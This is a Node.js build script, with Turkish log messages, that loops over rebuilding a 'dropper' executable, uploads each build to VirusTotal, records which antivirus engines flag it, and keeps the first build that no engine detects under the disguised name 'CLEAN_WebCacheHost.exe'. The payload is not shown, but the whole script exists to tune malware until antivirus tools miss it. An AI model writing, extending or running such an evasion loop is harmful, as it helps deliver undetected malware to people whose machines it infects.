const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const { execSync, spawnSync } = require("child_process");

const API = process.env.VT_API_KEY || "";
const ROOT = path.join(__dirname, "..");
const DROP = path.join(ROOT, "dropper");
const MAX = parseInt(process.env.VT_MAX || "12", 10);
const LOG = path.join(ROOT, "dropper", "vt_loop.log");

if (!API || API.length < 32) {
  console.error("[!] VT_API_KEY yok");
  process.exit(1);
}

function log(s) {
  const line = `[${new Date().toISOString()}] ${s}`;
  console.log(s);
  fs.appendFileSync(LOG, line + "\n");
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

async function vt(method, urlPath, body, isForm) {
  const url = "https://www.virustotal.com/api/v3" + urlPath;
  const headers = { "x-apikey": API };
  let opts = { method, headers };
  if (isForm) {
    opts.body = body;
  } else if (body) {
    headers["content-type"] = "application/json";
    opts.body = JSON.stringify(body);
  }
  const res = await fetch(url, opts);
  const text = await res.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch (_) {}
  if (!res.ok) {
    const msg = json?.error?.message || text.slice(0, 300);
    throw new Error(`VT ${res.status}: ${msg}`);
  }
  return json;
}

async function upload(filePath) {
  const size = fs.statSync(filePath).size;
  log(`upload ${(size / 1048576).toFixed(1)} MB`);
  let uploadUrl = "https://www.virustotal.com/api/v3/files";
  if (size > 32 * 1024 * 1024) {
    const u = await vt("GET", "/files/upload_url");
    uploadUrl = u.data;
  }
  const form = new FormData();
  const buf = fs.readFileSync(filePath);
  form.append("file", new Blob([buf]), path.basename(filePath));
  const res = await fetch(uploadUrl, {
    method: "POST",
    headers: { "x-apikey": API },
    body: form,
  });
  const text = await res.text();
  let json;
  try {
    json = JSON.parse(text);
  } catch (_) {
    throw new Error("upload parse: " + text.slice(0, 200));
  }
  if (!res.ok) throw new Error(`upload ${res.status}: ${text.slice(0, 300)}`);
  return json.data.id;
}

async function waitAnalysis(id) {
  for (let i = 0; i < 60; i++) {
    const j = await vt("GET", "/analyses/" + id);
    const st = j.data.attributes.status;
    if (st === "completed") return j;
    log(`analysis ${st} (${i + 1})`);
    await sleep(15000);
  }
  throw new Error("analysis timeout");
}

function pickExe() {
  const dist = path.join(DROP, "dist");
  const files = fs
    .readdirSync(dist)
    .filter((f) => f.toLowerCase().endsWith(".exe") && !f.includes("blockmap"))
    .map((f) => path.join(dist, f))
    .filter((f) => fs.statSync(f).size > 10_000_000);
  if (!files.length) throw new Error("exe yok");
  files.sort((a, b) => fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs);
  log("exe " + path.basename(files[0]) + " " + (fs.statSync(files[0]).size / 1048576).toFixed(1) + "MB");
  return files[0];
}

function cleanDist() {
  const dist = path.join(DROP, "dist");
  if (!fs.existsSync(dist)) return;
  for (const f of fs.readdirSync(dist)) {
    if (/\.(exe|blockmap|yml)$/i.test(f)) {
      try {
        fs.unlinkSync(path.join(dist, f));
      } catch (_) {}
    }
  }
}

function build() {
  log("build...");
  cleanDist();
  const r = spawnSync("cmd", ["/c", "pack.bat"], {
    cwd: DROP,
    encoding: "utf8",
    timeout: 600000,
  });
  if (r.stdout) process.stdout.write(r.stdout.slice(-2000));
  if (r.stderr) process.stderr.write(r.stderr.slice(-1000));
  if (r.status !== 0) throw new Error("build fail " + r.status);
  const exe = pickExe();
  const dest = path.join(ROOT, "dist", "VTHost.exe");
  fs.mkdirSync(path.dirname(dest), { recursive: true });
  fs.copyFileSync(exe, dest);
  return dest;
}

function ensureJar() {
  const jar = path.join(DROP, "res", "core.jar");
  const zip = path.join(DROP, "res", "app.zip");
  if (fs.existsSync(jar) && fs.existsSync(zip)) return;
  log("jar/zip eksik — pack-exe resources...");
  const r = spawnSync("cmd", ["/c", "pack-exe.bat"], {
    cwd: ROOT,
    encoding: "utf8",
    timeout: 900000,
  });
  if (r.status !== 0) throw new Error("pack-exe fail");
}

async function main() {
  fs.writeFileSync(LOG, "");
  ensureJar();
  for (let n = 1; n <= MAX; n++) {
    log(`===== attempt ${n}/${MAX} =====`);
    let exe;
    try {
      exe = build();
    } catch (e) {
      log("build err: " + e.message);
      await sleep(5000);
      continue;
    }
    let analysisId;
    try {
      analysisId = await upload(exe);
      log("analysis id=" + analysisId);
    } catch (e) {
      log("upload err: " + e.message);
      await sleep(60000);
      continue;
    }
    let result;
    try {
      result = await waitAnalysis(analysisId);
    } catch (e) {
      log("wait err: " + e.message);
      continue;
    }
    const stats = result.data.attributes.stats || {};
    const mal = stats.malicious || 0;
    const sus = stats.suspicious || 0;
    const und = stats.undetected || 0;
    log(`stats malicious=${mal} suspicious=${sus} undetected=${und}`);
    const results = result.data.attributes.results || {};
    const hits = Object.entries(results)
      .filter(([, v]) => v.category === "malicious" || v.category === "suspicious")
      .map(([k, v]) => `${k}:${v.result || v.category}`);
    if (hits.length) log("hits: " + hits.join(", "));
    if (mal === 0 && sus === 0) {
      log("CLEAN 0 detections");
      const out = path.join(ROOT, "dist", "CLEAN_WebCacheHost.exe");
      fs.copyFileSync(exe, out);
      log("saved " + out);
      process.exit(0);
    }
    await sleep(20000);
  }
  log("max attempts — 0 yok");
  process.exit(2);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
